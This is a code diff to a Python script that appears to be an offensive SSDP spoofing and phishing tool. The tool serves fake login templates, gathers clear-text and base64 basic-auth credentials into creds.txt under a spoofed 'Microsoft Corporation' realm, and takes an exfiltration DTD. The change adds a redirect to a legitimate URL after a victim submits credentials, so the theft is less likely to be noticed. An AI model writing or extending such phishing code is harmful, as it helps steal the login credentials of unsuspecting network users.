@@ -59,8 +59,9 @@ parser.add_argument('-b', '--basic', default=False, action="store_true", help="E
                     templates and write credentials to creds.txt")
 parser.add_argument("-r", "--realm", type=str, default="Microsoft Corporation", help="Realm to appear when prompting \
                     users for authentication via base64 auth.", action="store")
-parser.add_argument("-u", "--url", type=str, default="", help="Add javascript to the template to redirect from the \
-                    phishing page to the provided URL.", action="store")
+parser.add_argument("-u", "--url", type=str, default="", help="Redirect to this URL (ex: '-u http://google.com'). \
+                    Works with templates that do a POST for logon forms and with templates including the custom \
+                    redirect JavaScript (see README for more info).", action="store")
 args = parser.parse_args()
 
 charWhitelist = re.compile('[^a-zA-Z0-9 ._-]')        # Defining a list of expected characters for a network device 
@@ -172,9 +173,17 @@ def MakeHTTPClass(deviceXML, serviceXML, phishPage, exfilDTD):
                     self.wfile.write(phishPage.encode())
 
         def do_POST(self):
-            if self.path == '/ssdp/do_login.html':                      # For phishing templates to POST creds to
+            """
+            This is called from templates with a logon prompt - phishing for clear-text credentials.
+            It's probably best to use this with the '-u' parameter to redirect to a legit URL after POSTing.
+            Otherwise, we will simply refresh the page.
+            """
+            if self.path == '/ssdp/do_login.html':
                 self.send_response(301)
-                self.send_header('Location','http://{}:{}/present.html'.format(localIp, localPort))
+                if redirectUrl: 
+                    self.send_header('Location','{}'.format(redirectUrl))
+                else:
+                    self.send_header('Location','http://{}:{}/present.html'.format(localIp, localPort))
                 self.end_headers()
 
         def process_authentication(self):
